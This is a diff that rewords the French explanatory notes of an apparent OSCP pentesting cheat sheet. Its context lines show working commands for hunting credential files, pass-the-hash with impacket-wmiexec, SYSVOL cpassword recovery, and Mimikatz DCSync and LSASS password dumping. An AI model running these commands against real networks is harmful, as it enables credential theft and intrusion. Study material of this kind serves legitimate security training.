@@ -704,7 +704,7 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 
 ```
 
-<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
+<p class="oscp-command-note">Chercher les fichiers de configuration et d’identifiants accessibles.</p>
 
 ```powershell
 dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
@@ -778,7 +778,7 @@ C:\inetpub\wwwroot\web.config
 
 ```
 
-<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
+<p class="oscp-command-note">Chercher les fichiers de configuration et d’identifiants accessibles.</p>
 
 ```powershell
 dir c:*vnc.ini /s /b
@@ -993,7 +993,7 @@ sc query state= all | findstr "SERVICE_NAME"
 
 ```
 
-<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
+<p class="oscp-command-note">Chercher les fichiers de configuration et d’identifiants accessibles.</p>
 
 ```powershell
 # Rechercher dans C:\\ProgramData, C:\\Users\\All Users et les dossiers propres aux applications, par exemple C:\\Program Files.
@@ -1033,7 +1033,7 @@ impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>
 
 ```
 
-<p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>
+<p class="oscp-command-note">Se connecter à la cible via VNC ou RDP.</p>
 
 ```bash
 # RDP
@@ -1055,7 +1055,7 @@ impacket-wmiexec <username>:<password>@<target_ip>
 **Paramètres et repères :**
 `cpassword` · `SYSVOL`  
 
-<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
+<p class="oscp-command-note">Chercher les fichiers de configuration et d’identifiants accessibles.</p>
 
 ```powershell
 # Vérifiez le mot de passe cpass dans le partage SYSvol pour obtenir des mots de passe clairs dans les fichiers XML.
@@ -1112,7 +1112,7 @@ Examiner les objets, les droits et les services du domaine.
 **Paramètres et repères :**
 `mimikatz`  
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Analyser les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:<domain> /user:<target_user>
@@ -1148,7 +1148,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 **Paramètres et repères :**
 `LSASS` · `Mimikatz`  
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
+<p class="oscp-command-note">Analyser les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # sekurlsa::logonPasswords
